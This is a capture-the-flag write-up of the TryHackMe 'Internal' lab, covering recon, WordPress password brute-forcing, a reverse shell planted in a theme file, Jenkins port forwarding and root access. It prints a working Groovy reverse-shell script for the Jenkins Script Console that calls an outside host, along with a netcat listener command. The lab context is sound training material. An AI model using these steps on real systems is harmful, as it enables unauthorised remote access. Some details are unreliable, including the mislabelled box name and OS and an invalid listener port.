---
title: THM - Internal
author: z3nn
date: 2020-09-25 19:53:00 +0200
categories: [Hacking, TryHackMe]
description: TryHackMe Internal Windows Box
tags: [tryhackme, internal, windows, offensive pentest, security, security missconfiguration, pentest]
---

# TryHackMe - Internal
A write-up to the Relevant machine provided by [TryHackMe](https://tryhackme.com/) and created by [TheMayor](https://twitter.com/joehelle). This machine is part of the `Offensive Pentesting` learning path from THM in the `Advanced Exploitation` Section being rated as a `Hard` difficulty.... Let's get to it.

The description of this machine is quite nice, having a roleplay in it to put you into the mindset of a pentester that needs to gather information about it's target (`recon`).

> You might notice the machine IP changing a few times in this write-up... that's because I wrote this the day after I completed the challenge and I had to stop / start the machine as needed to get back some information.

# Recon
Starting off with a recon on the machine to see what ports are open, what services are active, etc.

```
$ nmap -sS -sV -oA internal-vuln --script=default,vuln -p- -T5 10.10.231.241
[sudo] password for z3nn:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-24 19:55 EEST
Nmap scan report for 10.10.231.241
Host is up (0.050s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| ssh-hostkey:
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
| vulners:
|   cpe:/a:openbsd:openssh:7.6p1:
|       CVE-2008-3844   9.3     https://vulners.com/cve/CVE-2008-3844
|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
|       CVE-2018-15473  5.0     https://vulners.com/cve/CVE-2018-15473
|       CVE-2019-16905  4.4     https://vulners.com/cve/CVE-2019-16905
|       CVE-2007-2768   4.3     https://vulners.com/cve/CVE-2007-2768
|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110
|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109
|       CVE-2014-9278   4.0     https://vulners.com/cve/CVE-2014-9278
|_      CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum:
|   /blog/: Blog
|   /phpmyadmin/: phpMyAdmin
|   /wordpress/wp-login.php: Wordpress login page.
|_  /blog/wp-login.php: Wordpress login page.
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-title: Apache2 Ubuntu Default Page: It works
| vulners:
|   cpe:/a:apache:http_server:2.4.29:
|       CVE-2010-0425   10.0    https://vulners.com/cve/CVE-2010-0425
|       CVE-1999-1412   10.0    https://vulners.com/cve/CVE-1999-1412
|       CVE-1999-1237   10.0    https://vulners.com/cve/CVE-1999-1237
|       CVE-1999-0236   10.0    https://vulners.com/cve/CVE-1999-0236
|       CVE-2009-1955   7.8     https://vulners.com/cve/CVE-2009-1955
|       CVE-2007-6423   7.8     https://vulners.com/cve/CVE-2007-6423
|       CVE-2007-0086   7.8     https://vulners.com/cve/CVE-2007-0086
|       CVE-2020-11984  7.5     https://vulners.com/cve/CVE-2020-11984
|       CVE-2009-3095   7.5     https://vulners.com/cve/CVE-2009-3095
|       CVE-2007-4723   7.5     https://vulners.com/cve/CVE-2007-4723
|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
|       CVE-2009-1891   7.1     https://vulners.com/cve/CVE-2009-1891
|       CVE-2009-1890   7.1     https://vulners.com/cve/CVE-2009-1890
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
|       CVE-2008-2579   6.8     https://vulners.com/cve/CVE-2008-2579
|       CVE-2007-5156   6.8     https://vulners.com/cve/CVE-2007-5156
|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
|       CVE-2019-10097  6.0     https://vulners.com/cve/CVE-2019-10097
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
|       CVE-2020-9490   5.0     https://vulners.com/cve/CVE-2020-9490
|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196
|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
|       CVE-2018-17189  5.0     https://vulners.com/cve/CVE-2018-17189
|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333
|       CVE-2018-1303   5.0     https://vulners.com/cve/CVE-2018-1303
|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231
|       CVE-2011-1752   5.0     https://vulners.com/cve/CVE-2011-1752
|       CVE-2010-1452   5.0     https://vulners.com/cve/CVE-2010-1452
|       CVE-2010-0408   5.0     https://vulners.com/cve/CVE-2010-0408
|       CVE-2009-2699   5.0     https://vulners.com/cve/CVE-2009-2699
|       CVE-2007-0450   5.0     https://vulners.com/cve/CVE-2007-0450
|       CVE-2005-1268   5.0     https://vulners.com/cve/CVE-2005-1268
|       CVE-2003-0020   5.0     https://vulners.com/cve/CVE-2003-0020
|       CVE-2001-1556   5.0     https://vulners.com/cve/CVE-2001-1556
|       CVE-1999-0678   5.0     https://vulners.com/cve/CVE-1999-0678
|       CVE-1999-0289   5.0     https://vulners.com/cve/CVE-1999-0289
|       CVE-1999-0070   5.0     https://vulners.com/cve/CVE-1999-0070
|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197
|       CVE-2009-1195   4.9     https://vulners.com/cve/CVE-2009-1195
|       CVE-2020-11993  4.3     https://vulners.com/cve/CVE-2020-11993
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
|       CVE-2018-1302   4.3     https://vulners.com/cve/CVE-2018-1302
|       CVE-2018-1301   4.3     https://vulners.com/cve/CVE-2018-1301
|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763
|       CVE-2011-1783   4.3     https://vulners.com/cve/CVE-2011-1783
|       CVE-2010-0434   4.3     https://vulners.com/cve/CVE-2010-0434
|       CVE-2008-2939   4.3     https://vulners.com/cve/CVE-2008-2939
|       CVE-2008-2168   4.3     https://vulners.com/cve/CVE-2008-2168
|       CVE-2008-0455   4.3     https://vulners.com/cve/CVE-2008-0455
|       CVE-2007-6420   4.3     https://vulners.com/cve/CVE-2007-6420
|       CVE-2007-6388   4.3     https://vulners.com/cve/CVE-2007-6388
|       CVE-2007-5000   4.3     https://vulners.com/cve/CVE-2007-5000
|       CVE-2007-4465   4.3     https://vulners.com/cve/CVE-2007-4465
|       CVE-2007-1349   4.3     https://vulners.com/cve/CVE-2007-1349
|       CVE-2007-6422   4.0     https://vulners.com/cve/CVE-2007-6422
|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
|       CVE-2007-6421   3.5     https://vulners.com/cve/CVE-2007-6421
|_      CVE-2001-0131   1.2     https://vulners.com/cve/CVE-2001-0131
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.98 seconds
```

Not many open ports unlike other machines, just a 22 and 80... but what's running on that port 80 is interesting. First impressions is that it's just a basic apache2 instalation and that's all, nothing much to it... but our scan reveals a bit more information

## The blog
There is a `/blog/` which appears to be some sort of wordpress blog... one problem, it looks fucked... just look at it...

![blog1](/assets/img/posts/thm_internal_blog1.jpg)

Checking the dev console... and some of the page links I noticed something, the missing refferences where pointing to `internal.htm`, a host which I didn't setup in my `/etc/hosts` file because I was lazy... let's do that

![blog2](/assets/img/posts/thm_internal_blog2.jpg)

Now it loos better :) ... back to hacking

Looking through what the webapp has to offer a tried a few things:
- exploiting xmlrpc.php (using metasploit)
- exploting phpmyadmin (using metasploit)


None of these were fruitfull, I resorted to trying to brutforce passwords in PhpMyAdmin and the Wordpress app. For wordpress I noticed on the first post that the Author was `Admin` so I used that as my username and for PhpMyAdmin I used the default `root` user.

I had success with WPscan to bruteforce the password for `admin`. 

Looking throught the Wordpress dashboard for admin I found a Private post that had credentials for good ol' Will... Will's credentials were useless.

### Gaining a foothold
One vulnerability here is the ability to edit the PHP files of Wordpress, so that's what we'll do.... Addidng the code for a PHP Reverse shell in the 404.php file does the trick.

We now have access ass `www-data`. Looking through `/home` we see there is no `will` user so that set of credentials was a total waste.... enumeraitng

> a few years of enumeration later

There's a `.txt` file hidden in /opt that has credentials for our user.

# PrivEsc

In the home of our user we can see a `jenkins.txt` file informs us of an internal Jenkins service running on a specific IP and port. 

We are going to forward it to our attacking machine:
```shell
ssh -L 9595:172.17.0.2:8080 aubreanna@internal.thm
```

After this we can now access the Jenkins app in our browser with: `http://127.0.0.1:9595`. There's no easy way from here, just brute force for the jenkins password.

After credentials are obtained next thing we can do is abuse the Groovy Script console to get Shell.
Go To `Manage Jenkins` > `Script Console` and add the following script.

```groovy
String host="1.1.1.1";
int port=8586;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Open a netcat listener on attacking machine on the same port as the one in our Groovy script:
```
nc -lnvp 85856
```

Run the groovy script. We now have a reverse shell as Jenkins. This time I went straight to check the `/opt` directory to see if this machine has something else there... surprise, there's root credentials

> ssh into the machine using the root credentials and get flag.